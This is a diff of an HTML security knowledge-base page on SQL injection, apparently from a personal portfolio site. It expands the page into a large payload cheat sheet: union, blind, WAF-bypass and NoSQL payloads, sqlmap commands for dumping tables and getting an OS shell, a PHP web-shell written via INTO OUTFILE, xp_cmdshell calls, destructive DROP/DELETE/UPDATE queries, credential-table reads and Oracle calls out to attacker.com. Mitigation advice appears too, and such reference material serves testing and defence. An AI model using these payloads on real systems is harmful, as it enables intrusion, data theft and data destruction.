@@ -11,7 +11,7 @@
     :root { --primary: #00f5a0; --bg-dark: #0a0c10; --bg-card: #111827; --bg-elevated: #1a1f2e; --text-primary: #e8edf5; --text-secondary: #9ca3af; --border: #1f2937; }
     body.light { --bg-dark: #f3f4f6; --bg-card: #ffffff; --bg-elevated: #e5e7eb; --text-primary: #111827; --text-secondary: #4b5563; --border: #d1d5db; }
     body { font-family: 'Inter', sans-serif; background: var(--bg-dark); color: var(--text-primary); line-height: 1.6; transition: all 0.3s ease; }
-    .container { max-width: 1200px; margin: 0 auto; padding: 0 2rem; }
+    .container { max-width: 1300px; margin: 0 auto; padding: 0 2rem; }
     .navbar { position: sticky; top: 0; background: var(--bg-dark); border-bottom: 1px solid var(--border); padding: 1rem 0; z-index: 100; backdrop-filter: blur(8px); }
     .nav-flex { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
     .logo { font-size: 1.5rem; font-weight: 700; text-decoration: none; color: var(--text-primary); }
@@ -28,25 +28,32 @@
     .severity-badge { display: inline-block; background: rgba(255, 68, 68, 0.2); color: #ff4444; padding: 0.3rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
     .content-section { margin: 2rem 0; }
     .content-section h2 { font-size: 1.5rem; margin: 1.5rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; }
-    .content-section h3 { font-size: 1.2rem; margin: 1rem 0 0.5rem; }
+    .content-section h3 { font-size: 1.2rem; margin: 1rem 0 0.5rem; color: var(--text-primary); }
     .content-section p { margin-bottom: 1rem; color: var(--text-secondary); }
     .content-section ul, .content-section ol { margin: 1rem 0 1.5rem 2rem; color: var(--text-secondary); }
     .content-section li { margin-bottom: 0.5rem; }
     .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.85rem; color: var(--primary); position: relative; }
     .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: none; padding: 0.2rem 0.5rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.7rem; }
     .copy-btn:hover { color: var(--primary); }
-    .payload-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 1rem; margin: 1rem 0; }
-    .payload-item { background: var(--bg-elevated); border: 1px solid var(--border); border-radius: 0.5rem; padding: 0.75rem; font-family: monospace; font-size: 0.75rem; }
+    .payload-category { margin: 1.5rem 0 1rem; padding: 0.5rem; background: var(--bg-elevated); border-radius: 8px; font-weight: 700; color: var(--primary); }
+    .payload-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 0.8rem; margin: 1rem 0; }
+    .payload-item { background: var(--bg-elevated); border: 1px solid var(--border); border-radius: 0.5rem; padding: 0.7rem; font-family: monospace; font-size: 0.75rem; word-break: break-all; }
     .vulnerability-box { background: rgba(255, 68, 68, 0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
     .mitigation-box { background: rgba(0, 245, 160, 0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
     .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
     footer { text-align: center; padding: 2rem; border-top: 1px solid var(--border); color: var(--text-secondary); font-size: 0.8rem; }
+    table { width: 100%; border-collapse: collapse; background: var(--bg-card); border: 1px solid var(--border); margin: 1rem 0; }
+    th, td { padding: 0.75rem; text-align: left; border-bottom: 1px solid var(--border); }
+    th { background: var(--bg-elevated); color: var(--primary); }
+    .reference-link { color: var(--primary); text-decoration: none; }
+    .reference-link:hover { text-decoration: underline; }
     @media (max-width: 768px) {
       .container { padding: 0 1rem; }
       .mobile-menu { display: block; }
       .nav-links { display: none; width: 100%; flex-direction: column; padding: 1rem 0; gap: 1rem; }
       .nav-links.show { display: flex; }
       .page-header h1 { font-size: 1.8rem; }
+      .payload-grid { grid-template-columns: 1fr; }
     }
   </style>
 </head>
@@ -59,6 +66,7 @@
     <ul class="nav-links" id="navLinks">
       <li><a href="../index.html">Home</a></li>
       <li><a href="../knowledge-base.html">Knowledge Base</a></li>
+      <li><a href="../resume.html">Resume</a></li>
       <li><a href="../blog.html">Write-ups</a></li>
       <li><a href="../tools.html">Tools</a></li>
       <li><a href="../index.html#contact">Contact</a></li>
@@ -71,158 +79,364 @@
   <div class="container">
     <div class="breadcrumb"><a href="../knowledge-base.html">Knowledge Base</a> / <a href="index.html">Web Security</a> / SQL Injection</div>
     <div class="page-header">
-      <span class="severity-badge"><i class="fas fa-exclamation-triangle"></i> Critical Severity</span>
-      <h1>📌 SQL Injection</h1>
+      <span class="severity-badge"><i class="fas fa-exclamation-triangle"></i> Critical Severity | OWASP A03:2021</span>
+      <h1>📌 SQL Injection (SQLi)</h1>
     </div>
 
+    <!-- Description -->
     <div class="content-section">
       <h2>🧠 Description</h2>
       <p><strong>What is SQL Injection?</strong></p>
       <p>SQL Injection is a code injection technique that allows attackers to interfere with the queries an application makes to its database. It occurs when user input is improperly sanitized before being included in SQL queries.</p>
-      <p><strong>Why does it occur?</strong></p>
-      <p>Applications construct SQL queries by concatenating user input directly into the query string without proper sanitization or parameterization.</p>
+      <p><strong>Types of SQL Injection:</strong></p>
+      <ul>
+        <li><strong>Error-Based SQLi:</strong> Relies on error messages to extract information</li>
+        <li><strong>Union-Based SQLi:</strong> Uses UNION operator to combine results</li>
+        <li><strong>Boolean-Based Blind SQLi:</strong> Infers information based on true/false responses</li>
+        <li><strong>Time-Based Blind SQLi:</strong> Uses time delays to infer information</li>
+        <li><strong>Out-of-Band SQLi:</strong> Uses DNS or HTTP requests to exfiltrate data</li>
+        <li><strong>Second-Order SQLi:</strong> Payloads stored and executed later</li>
+      </ul>
       <p><strong>Security principle violated:</strong> Input Validation</p>
       <p><strong>Real-world analogy:</strong> Like someone filling out a form and instead of writing their name, they write "DROP TABLE users" - and the system blindly executes it.</p>
     </div>
 
+    <!-- Classification -->
     <div class="content-section">
       <h2>🏷️ Classification</h2>
       <ul>
         <li><strong>Type:</strong> Injection</li>
         <li><strong>OWASP:</strong> A03:2021 – Injection</li>
         <li><strong>CWE:</strong> CWE-89: Improper Neutralization of Special Elements used in an SQL Command</li>
+        <li><strong>CAPEC:</strong> CAPEC-66: SQL Injection</li>
       </ul>
     </div>
 
+    <!-- Attack Surface -->
     <div class="content-section">
       <h2>🎯 Attack Surface (Where to Test)</h2>
       <ul>
-        <li>✅ URL parameters (<code>?id=</code>, <code>?user=</code>)</li>
-        <li>✅ POST body (JSON, form-data, XML)</li>
-        <li>✅ Headers (User-Agent, Referer, X-Forwarded-For)</li>
+        <li>✅ URL parameters (<code>?id=</code>, <code>?user=</code>, <code>?page=</code>)</li>
+        <li>✅ POST body (JSON, form-data, XML, multipart/form-data)</li>
+        <li>✅ Headers (User-Agent, Referer, X-Forwarded-For, Cookie)</li>
         <li>✅ Cookies / Sessions</li>
         <li>✅ File uploads (filename injection)</li>
-        <li>✅ API endpoints (REST / GraphQL)</li>
+        <li>✅ API endpoints (REST, GraphQL)</li>
+        <li>✅ Order By / Sort parameters</li>
+        <li>✅ JSON properties</li>
+        <li>✅ XML nodes</li>
       </ul>
     </div>
 
+    <!-- Detection Methodology -->
     <div class="content-section">
       <h2>🔍 Detection Methodology</h2>
       <h3>1. Static Analysis (Source Code)</h3>
-      <div class="code-block">
-        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
-        <pre>// Vulnerable code pattern
-String query = "SELECT * FROM users WHERE id = " + request.getParameter("id");
-Statement stmt = conn.createStatement();
-ResultSet rs = stmt.executeQuery(query);</pre>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre>// Vulnerable code pattern - String concatenation
+String query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
+
+// Vulnerable PHP
+$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
+
+// Vulnerable Python
+cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
+
+// Vulnerable Node.js
+connection.query(`SELECT * FROM users WHERE id = ${userId}`)</pre>
       </div>
 
       <h3>2. Dynamic Analysis (Burp Suite / Manual)</h3>
       <ul>
         <li>Intercept request and inject single quote (<code>'</code>)</li>
-        <li>Observe error messages for database information</li>
-        <li>Use time-based payloads to detect blind injection</li>
+        <li>Inject double quote (<code>"</code>)</li>
+        <li>Inject backtick (<code>`</code>)</li>
+        <li>Inject <code>' OR '1'='1</code></li>
+        <li>Inject <code>' AND 1=1--</code></li>
+        <li>Inject <code>' AND SLEEP(5)--</code> (time-based)</li>
+        <li>Observe error messages, response changes, time delays</li>
       </ul>
-      <p><strong>Tools:</strong> Burp Suite, SQLmap, OWASP ZAP</p>
+      <p><strong>Tools:</strong> Burp Suite (Repeater, Intruder), SQLmap, OWASP ZAP, FFUF, Nuclei</p>
     </div>
 
+    <!-- ALL PAYLOADS - Complete Collection -->
     <div class="content-section">
-      <h2>💣 Basic Payloads</h2>
+      <h2>💣 Basic Detection Payloads</h2>
       <div class="payload-grid">
+        <div class="payload-item">'</div>
+        <div class="payload-item">"</div>
+        <div class="payload-item">`</div>
         <div class="payload-item">' OR '1'='1</div>
-        <div class="payload-item">' OR 1=1--</div>
-        <div class="payload-item">" OR "1"="1</div>
+        <div class="payload-item">' OR '1'='1'--</div>
         <div class="payload-item">' OR '1'='1'#</div>
+        <div class="payload-item">" OR "1"="1</div>
+        <div class="payload-item">" OR "1"="1"--</div>
+        <div class="payload-item">' OR 1=1--</div>
         <div class="payload-item">' OR 1=1#</div>
         <div class="payload-item">' OR 1=1/*</div>
+        <div class="payload-item">' OR 'x'='x</div>
+        <div class="payload-item">' OR 'x'='x'--</div>
+        <div class="payload-item">' OR 'x'='x'#</div>
+        <div class="payload-item">' OR 1=1 LIMIT 1--</div>
+        <div class="payload-item">' AND 1=1--</div>
+        <div class="payload-item">' AND 1=2--</div>
+      </div>
+
+      <div class="payload-category">📊 Union-Based Payloads</div>
+      <div class="payload-grid">
+        <div class="payload-item">' UNION SELECT NULL--</div>
+        <div class="payload-item">' UNION SELECT NULL,NULL--</div>
+        <div class="payload-item">' UNION SELECT NULL,NULL,NULL--</div>
+        <div class="payload-item">' UNION SELECT 1,2,3--</div>
+        <div class="payload-item">' UNION SELECT @@version,2,3--</div>
+        <div class="payload-item">' UNION SELECT database(),user(),version()--</div>
+        <div class="payload-item">' UNION SELECT table_name,NULL FROM information_schema.tables--</div>
+        <div class="payload-item">' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--</div>
+        <div class="payload-item">' UNION SELECT username,password FROM users--</div>
+        <div class="payload-item">' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--</div>
+        <div class="payload-item">' UNION SELECT @@datadir,@@hostname,@@version_compile_os--</div>
+        <div class="payload-item">') UNION SELECT NULL,NULL,NULL--</div>
+        <div class="payload-item">" UNION SELECT NULL,NULL,NULL--</div>
+        <div class="payload-item">` UNION SELECT NULL,NULL,NULL--</div>
+      </div>
+
+      <div class="payload-category">⏱️ Time-Based Blind Payloads</div>
+      <div class="payload-grid">
+        <div class="payload-item">' AND SLEEP(5)-- (MySQL)</div>
+        <div class="payload-item">' AND BENCHMARK(1000000,MD5('a'))-- (MySQL)</div>
+        <div class="payload-item">' OR SLEEP(5)--</div>
+        <div class="payload-item">' WAITFOR DELAY '0:0:5'-- (MSSQL)</div>
+        <div class="payload-item">' WAITFOR DELAY '00:00:05'-- (MSSQL)</div>
+        <div class="payload-item">' AND 1=1 WAITFOR DELAY '0:0:5'-- (MSSQL)</div>
+        <div class="payload-item">' || pg_sleep(5)-- (PostgreSQL)</div>
+        <div class="payload-item">' AND pg_sleep(5)::text-- (PostgreSQL)</div>
+        <div class="payload-item">' AND (SELECT * FROM pg_sleep(5))-- (PostgreSQL)</div>
+        <div class="payload-item">' AND dbms_pipe.receive_message('x',5)-- (Oracle)</div>
+        <div class="payload-item">' AND 1=dbms_pipe.receive_message('x',5)-- (Oracle)</div>
+        <div class="payload-item">' AND RDBMS_SCHEDULER.SLEEP(5)-- (Oracle)</div>
+        <div class="payload-item">' AND 1=utl_http.request('http://attacker.com')-- (Oracle)</div>
+        <div class="payload-item">' WAITFOR DELAY '0:0:5' AND 1=1-- (MSSQL)</div>
+      </div>
+
+      <div class="payload-category">🎯 Boolean-Based Blind Payloads</div>
+      <div class="payload-grid">
+        <div class="payload-item">' AND 1=1--</div>
+        <div class="payload-item">' AND 1=2--</div>
+        <div class="payload-item">' AND 'a'='a--</div>
+        <div class="payload-item">' AND 'a'='b--</div>
+        <div class="payload-item">' AND (SELECT 'a' FROM users LIMIT 1)='a'--</div>
+        <div class="payload-item">' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--</div>
+        <div class="payload-item">' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users WHERE id=1)=97--</div>
+        <div class="payload-item">' AND (SELECT COUNT(*) FROM users)>0--</div>
+        <div class="payload-item">' AND (SELECT LENGTH(username) FROM users WHERE id=1)=5--</div>
+        <div class="payload-item">' AND IF(1=1,1,0)-- (MySQL)</div>
+        <div class="payload-item">' AND IF(1=2,1,0)-- (MySQL)</div>
+      </div>
+
+      <div class="payload-category">🗄️ Database-Specific Payloads - MySQL</div>
+      <div class="payload-grid">
+        <div class="payload-item">' UNION SELECT @@GLOBAL.version--</div>
+        <div class="payload-item">' UNION SELECT @@version_comment--</div>
+        <div class="payload-item">' UNION SELECT user()--</div>
+        <div class="payload-item">' UNION SELECT database()--</div>
+        <div class="payload-item">' UNION SELECT schema_name FROM information_schema.schemata--</div>
+        <div class="payload-item">' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--</div>
+        <div class="payload-item">' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--</div>
+        <div class="payload-item">' UNION SELECT LOAD_FILE('/etc/passwd')--</div>
+        <div class="payload-item">' UNION SELECT INTO OUTFILE '/var/www/html/shell.php'--</div>
+        <div class="payload-item">' AND 1=1 INTO OUTFILE '/tmp/out.txt'--</div>
+        <div class="payload-item">' OR 1=1 INTO DUMPFILE '/tmp/out.txt'--</div>
+        <div class="payload-item">' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--</div>
+      </div>
+
+      <div class="payload-category">🏢 Database-Specific Payloads - MSSQL</div>
+      <div class="payload-grid">
+        <div class="payload-item">' UNION SELECT @@version--</div>
+        <div class="payload-item">' UNION SELECT DB_NAME()--</div>
+        <div class="payload-item">' UNION SELECT name FROM master..sysdatabases--</div>
+        <div class="payload-item">' UNION SELECT name FROM sysobjects WHERE xtype='U'--</div>
+        <div class="payload-item">' UNION SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--</div>
+        <div class="payload-item">' EXEC xp_cmdshell('dir')--</div>
+        <div class="payload-item">' EXEC xp_cmdshell('whoami')--</div>
+        <div class="payload-item">' EXEC xp_cmdshell('ipconfig')--</div>
+        <div class="payload-item">' UNION SELECT 1,2,3 FROM information_schema.tables--</div>
+        <div class="payload-item">' UNION SELECT table_name FROM information_schema.tables--</div>
+        <div class="payload-item">' WAITFOR DELAY '0:0:5'--</div>
+        <div class="payload-item">' UNION SELECT 1,2,3 FROM sysobjects--</div>
+      </div>
+
+      <div class="payload-category">🐘 Database-Specific Payloads - PostgreSQL</div>
+      <div class="payload-grid">
+        <div class="payload-item">' UNION SELECT version()--</div>
+        <div class="payload-item">' UNION SELECT current_database()--</div>
+        <div class="payload-item">' UNION SELECT datname FROM pg_database--</div>
+        <div class="payload-item">' UNION SELECT tablename FROM pg_tables WHERE schemaname='public'--</div>
+        <div class="payload-item">' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--</div>
+        <div class="payload-item">' UNION SELECT usename FROM pg_user--</div>
+        <div class="payload-item">' UNION SELECT passwd FROM pg_shadow--</div>
+        <div class="payload-item">' UNION SELECT pg_read_file('/etc/passwd')--</div>
+        <div class="payload-item">' || pg_sleep(5)--</div>
+        <div class="payload-item">' AND 1=CAST(pg_sleep(5) AS text)--</div>
+        <div class="payload-item">' COPY (SELECT '') TO '/tmp/out.txt'--</div>
+      </div>
+
+      <div class="payload-category">🔶 Database-Specific Payloads - Oracle</div>
+      <div class="payload-grid">
+        <div class="payload-item">' UNION SELECT banner FROM v$version--</div>
+        <div class="payload-item">' UNION SELECT global_name FROM global_name--</div>
+        <div class="payload-item">' UNION SELECT owner FROM all_tables--</div>
+        <div class="payload-item">' UNION SELECT table_name FROM all_tables WHERE owner='SCHEMA'--</div>
+        <div class="payload-item">' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'--</div>
+        <div class="payload-item">' UNION SELECT username FROM all_users--</div>
+        <div class="payload-item">' UNION SELECT password FROM dba_users--</div>
+        <div class="payload-item">' AND 1=utl_http.request('http://attacker.com')--</div>
+        <div class="payload-item">' AND dbms_pipe.receive_message('x',5)--</div>
+        <div class="payload-item">' AND RDBMS_SCHEDULER.SLEEP(5)--</div>
+      </div>
+
+      <div class="payload-category">🔄 NoSQL Injection Payloads</div>
+      <div class="payload-grid">
+        <div class="payload-item">{"$ne": null}</div>
+        <div class="payload-item">{"$gt": ""}</div>
+        <div class="payload-item">{"$regex": ".*"}</div>
+        <div class="payload-item">{"$or": []}</div>
+        <div class="payload-item">{"$where": "1==1"}</div>
+        <div class="payload-item">{"username": {"$ne": null}, "password": {"$ne": null}}</div>
+        <div class="payload-item">' || '1'=='1</div>
+        <div class="payload-item">' && this.password.match(/.*/)//</div>
+        <div class="payload-item">{"$ne": ""}</div>
+        <div class="payload-item">{"$in": []}</div>
+        <div class="payload-item">{"$nin": []}</div>
+      </div>
+
+      <div class="payload-category">🚀 WAF Bypass Payloads</div>
+      <div class="payload-grid">
+        <div class="payload-item">' OR 1=1-- -</div>
+        <div class="payload-item">' OR 1=1#</div>
+        <div class="payload-item">' OR 1=1%23</div>
+        <div class="payload-item">' OR 1=1%00</div>
+        <div class="payload-item">' OR 1=1/**/--</div>
+        <div class="payload-item">' OR/**/1=1--</div>
+        <div class="payload-item">' O/**/R 1=1--</div>
+        <div class="payload-item">' OR 1=1 AND '1'='1</div>
+        <div class="payload-item">' OR '1'='1' AND '1'='1</div>
+        <div class="payload-item">%27%20OR%201%3D1--</div>
+        <div class="payload-item">%2527%2520OR%25201%253D1--</div>
+        <div class="payload-item">' OR 1=1 UNION SELECT 1,2,3--</div>
+        <div class="payload-item">' OR 1=1 UNION/**/SELECT 1,2,3--</div>
+        <div class="payload-item">' OR 1=1 UNION%23%0ASELECT 1,2,3--</div>
+        <div class="payload-item">' OR 1=1 UNION(SELECT 1,2,3)--</div>
+        <div class="payload-item">'/**/OR/**/1=1--</div>
+        <div class="payload-item">'/*!OR*/ 1=1--</div>
+        <div class="payload-item">' OR 1=1-- -</div>
+        <div class="payload-item">' OR 1=1#</div>
+        <div class="payload-item">' OR 1=1%23</div>
+        <div class="payload-item">' OR 1=1%00</div>
+        <div class="payload-item">' OR 1=1 AND '1'='1</div>
+      </div>
+
+      <div class="payload-category">📝 Stacked Queries (MSSQL/PostgreSQL)</div>
+      <div class="payload-grid">
+        <div class="payload-item">'; DROP TABLE users--</div>
+        <div class="payload-item">'; DELETE FROM users WHERE 1=1--</div>
+        <div class="payload-item">'; INSERT INTO users VALUES('hacker','pass')--</div>
+        <div class="payload-item">'; UPDATE users SET password='hacked' WHERE username='admin'--</div>
+        <div class="payload-item">'; EXEC xp_cmdshell('dir')-- (MSSQL)</div>
+        <div class="payload-item">'; SELECT pg_sleep(5)-- (PostgreSQL)</div>
+      </div>
+
+      <div class="payload-category">🔧 SQLmap Automation Commands</div>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Basic detection
+sqlmap -u "https://target.com/page?id=1"
+
+# Get databases
+sqlmap -u "https://target.com/page?id=1" --dbs
+
+# Get tables
+sqlmap -u "https://target.com/page?id=1" -D database_name --tables
+
+# Dump table
+sqlmap -u "https://target.com/page?id=1" -D database_name -T users --dump
+
+# Get columns
+sqlmap -u "https://target.com/page?id=1" -D database_name -T users --columns
+
+# OS shell
+sqlmap -u "https://target.com/page?id=1" --os-shell
+
+# Batch mode with random user-agent
+sqlmap -u "https://target.com/page?id=1" --batch --random-agent
+
+# Level and risk
+sqlmap -u "https://target.com/page?id=1" --level=5 --risk=3
+
+# Using cookie
+sqlmap -u "https://target.com/page?id=1" --cookie="session=value"
+
+# POST request
+sqlmap -u "https://target.com/login" --data="user=admin&pass=test"
+
+# Time-based blind
+sqlmap -u "https://target.com/page?id=1" --technique=T
+
+# Boolean-based blind
+sqlmap -u "https://target.com/page?id=1" --technique=B
+
+# Union-based
+sqlmap -u "https://target.com/page?id=1" --technique=U
+
+# Error-based
+sqlmap -u "https://target.com/page?id=1" --technique=E</pre>
       </div>
     </div>
 
-    <div class="content-section">
-      <h2>🚀 Advanced Payloads / Bypass</h2>
-      <div class="code-block">
-        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
-        <pre># Union-based payloads
-' UNION SELECT NULL--
-' UNION SELECT NULL,NULL--
-' UNION SELECT NULL,NULL,NULL--
-' UNION SELECT 1,2,3--
-' UNION SELECT @@version,2,3--
-' UNION SELECT username,password FROM users--
-
-# Time-based (MySQL)
-' OR SLEEP(5)--
-' OR BENCHMARK(1000000,MD5('a'))--
-
-# Boolean-based
-' AND 1=1--
-' AND 1=2--
-
-# Stacked queries
-'; DROP TABLE users; --
-
-# WAF Bypass - Case Obfuscation
-' Or 1=1--
-' oR 1=1--
-
-# WAF Bypass - URL Encoding
-%27%20OR%201%3D1--
-
-# WAF Bypass - Comment Obfuscation
-'/**/OR/**/1=1--
-' OR 1=1-- -
-
-# WAF Bypass - Double Encoding
-%2527%2520OR%25201%253D1--
-
-# MSSQL Specific
-' WAITFOR DELAY '0:0:5'--
-' EXEC xp_cmdshell('dir')--
-
-# PostgreSQL Specific
-' || pg_sleep(5)--
-' SELECT pg_read_file('/etc/passwd')--
-
-# Oracle Specific
-' || utl_http.request('http://attacker.com')--</pre>
-      </div>
-    </div>
-
+    <!-- Test Cases -->
     <div class="content-section">
       <h2>🧪 Test Cases (STRICT)</h2>
-      <table style="width: 100%; border-collapse: collapse; background: var(--bg-card); border: 1px solid var(--border);">
-        <thead><tr style="background: var(--bg-elevated);"><th style="padding: 0.75rem; text-align: left;">Step</th><th style="padding: 0.75rem; text-align: left;">Action</th><th style="padding: 0.75rem; text-align: left;">Expected</th><th style="padding: 0.75rem; text-align: left;">Actual</th></tr></thead>
+       <table>
+        <thead><tr><th>Step</th><th>Action</th><th>Expected</th><th>Actual</th></tr></thead>
         <tbody>
-          <tr><td style="padding: 0.75rem; border-bottom: 1px solid var(--border);">1</td><td style="padding: 0.75rem; border-bottom: 1px solid var(--border);">Inject <code>'</code></td><td style="padding: 0.75rem; border-bottom: 1px solid var(--border);">Error message</td><td style="padding: 0.75rem; border-bottom: 1px solid var(--border);">SQL syntax error</td></tr>
-          <tr><td style="padding: 0.75rem; border-bottom: 1px solid var(--border);">2</td><td style="padding: 0.75rem; border-bottom: 1px solid var(--border);">Inject <code>' OR '1'='1</code></td><td style="padding: 0.75rem; border-bottom: 1px solid var(--border);">All records returned</td><td style="padding: 0.75rem; border-bottom: 1px solid var(--border);">Authentication bypass</td></tr>
-          <tr><td style="padding: 0.75rem;">3</td><td style="padding: 0.75rem;">Inject <code>' AND SLEEP(5)--</code></td><td style="padding: 0.75rem;">5-second delay</td><td style="padding: 0.75rem;">Time-based blind injection</td></tr>
+          <tr><td>1</td><td>Inject <code>'</code></td><td>Error message</td><td>SQL syntax error</td></tr>
+          <tr><td>2</td><td>Inject <code>' OR '1'='1</code></td><td>All records returned</td><td>Authentication bypass</td></tr>
+          <tr><td>3</td><td>Inject <code>' AND 1=1--</code></td><td>Normal response</td><td>Same as normal</td></tr>
+          <tr><td>4</td><td>Inject <code>' AND 1=2--</code></td><td>Empty/error response</td><td>Different response</td></tr>
+          <tr><td>5</td><td>Inject <code>' AND SLEEP(5)--</code></td><td>5-second delay</td><td>Time-based blind detected</td></tr>
+          <tr><td>6</td><td>Inject <code>' UNION SELECT 1,2,3--</code></td><td>Numbers in response</td><td>Union-based injection</td></tr>
         </tbody>
       </table>
-      <p style="margin-top: 1rem;">✔ Must be reproducible</p>
+      <p>✔ Must be reproducible</p>
     </div>
 
+    <!-- Exploitation Steps -->
     <div class="content-section">
       <h2>⚙️ Exploitation Steps</h2>
       <ol>
         <li>Identify vulnerable parameter (test with <code>'</code>, <code>"</code>, <code>')</code>)</li>
         <li>Determine database type (MySQL, PostgreSQL, MSSQL, Oracle)</li>
+        <li>Use error messages to gather information</li>
         <li>Use UNION attacks to extract data</li>
+        <li>Use boolean/time-based techniques for blind injection</li>
         <li>Extract table names, column names, and data</li>
         <li>Escalate to OS command execution (if applicable)</li>
+        <li>Use SQLmap for automated exploitation</li>
       </ol>
     </div>
 
+    <!-- Mitigation -->
     <div class="content-section">
       <h2>🛡️ Mitigation</h2>
       <div class="mitigation-box">
-        <strong>✅ Parameterized Queries (Prepared Statements):</strong> Always use prepared statements with bound parameters.<br>
-        <strong>✅ Input Validation:</strong> Whitelist allowed characters and validate data types.<br>
-        <strong>✅ Stored Procedures:</strong> Use stored procedures with limited privileges.<br>
-        <strong>✅ Escaping User Input:</strong> Properly escape special characters.<br>
-        <strong>✅ Least Privilege:</strong> Database accounts should have minimal required permissions.
+        <strong>✅ Parameterized Queries (Prepared Statements):</strong> Always use prepared statements with bound parameters<br>
+        <strong>✅ Input Validation:</strong> Whitelist allowed characters and validate data types<br>
+        <strong>✅ Stored Procedures:</strong> Use stored procedures with limited privileges<br>
+        <strong>✅ Escaping User Input:</strong> Properly escape special characters (last resort)<br>
+        <strong>✅ Least Privilege:</strong> Database accounts should have minimal required permissions<br>
+        <strong>✅ WAF:</strong> Deploy Web Application Firewall with SQL injection rules<br>
+        <strong>✅ Regular Patching:</strong> Keep database software updated<br>
+        <strong>✅ Security Headers:</strong> Implement CSP and other security headers
       </div>
-      <div class="code-block">
-        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
         <pre>// Secure implementation (Java - PreparedStatement)
 String query = "SELECT * FROM users WHERE id = ?";
 PreparedStatement stmt = conn.prepareStatement(query);
@@ -234,57 +448,69 @@ cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
 
 // PHP - PDO
 $stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
-$stmt->execute(['id' => $userId]);</pre>
+$stmt->execute(['id' => $userId]);
+
+// Node.js - Parameterized
+connection.query("SELECT * FROM users WHERE id = ?", [userId])
+
+// C# - Parameterized
+SqlCommand cmd = new SqlCommand("SELECT * FROM users WHERE id = @id", conn);
+cmd.Parameters.AddWithValue("@id", userId);</pre>
       </div>
     </div>
 
-    <div class="content-section">
-      <h2>🔓 Mitigation Bypass</h2>
-      <ul>
-        <li><strong>Weak WAF Rules:</strong> Use case obfuscation (<code>Or 1=1</code>), comments (<code>/**/</code>), or URL encoding</li>
-        <li><strong>Incomplete Blacklisting:</strong> Use alternative SQL syntax or stacked queries</li>
-        <li><strong>Encoding Tricks:</strong> Double URL encoding, Unicode encoding</li>
-      </ul>
-    </div>
-
+    <!-- Risk / Impact -->
     <div class="content-section">
       <h2>⚠️ Risk / Impact</h2>
       <div class="vulnerability-box">
         <strong>Severity: Critical</strong><br><br>
         <strong>Impact:</strong>
         <ul>
-          <li><strong>Data breach:</strong> Read sensitive data (usernames, passwords, PII, financial data)</li>
+          <li><strong>Data breach:</strong> Read sensitive data (usernames, passwords, PII, financial data, medical records)</li>
           <li><strong>Authentication bypass:</strong> Log in as any user without password</li>
           <li><strong>Data manipulation:</strong> Insert, update, delete records</li>
           <li><strong>Remote Code Execution:</strong> Execute OS commands (depending on DB permissions)</li>
-          <li><strong>Denial of Service:</strong> Delete tables or overload database</li>
+          <li><strong>Denial of Service:</strong> Delete tables, drop databases, overload database</li>
+          <li><strong>Privilege Escalation:</strong> Gain higher database privileges</li>
+          <li><strong>Regulatory fines:</strong> GDPR, HIPAA, PCI-DSS violations</li>
         </ul>
       </div>
     </div>
 
+    <!-- Proof of Concept -->
     <div class="content-section">
       <h2>📎 Proof of Concept (PoC)</h2>
-      <div class="code-block">
-        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
         <pre># SQLmap automated exploitation
-sqlmap -u "https://target.com/page?id=1" --dbs
+sqlmap -u "https://target.com/page?id=1" --dbs --batch
 sqlmap -u "https://target.com/page?id=1" -D database_name --tables
 sqlmap -u "https://target.com/page?id=1" -D database_name -T users --dump
 
-# Manual exploitation
+# Manual exploitation - Authentication bypass
+https://target.com/login?username=admin' OR '1'='1&password=anything
+
+# Manual exploitation - Union-based
 https://target.com/page?id=1' UNION SELECT username,password FROM users--
 
-# Time-based blind (MySQL)
-https://target.com/page?id=1' AND SLEEP(5)--</pre>
+# Manual exploitation - Time-based
+https://target.com/page?id=1' AND SLEEP(5)--
+
+# Manual exploitation - Boolean-based
+https://target.com/page?id=1' AND ASCII(SUBSTRING((SELECT database()),1,1))>100--</pre>
       </div>
     </div>
 
+    <!-- References -->
     <div class="content-section">
-      <h2>📚 References</h2>
+      <h2>📚 References & Further Reading</h2>
       <ul>
-        <li><a href="https://owasp.org/www-community/attacks/SQL_Injection" style="color: var(--primary);">OWASP SQL Injection</a></li>
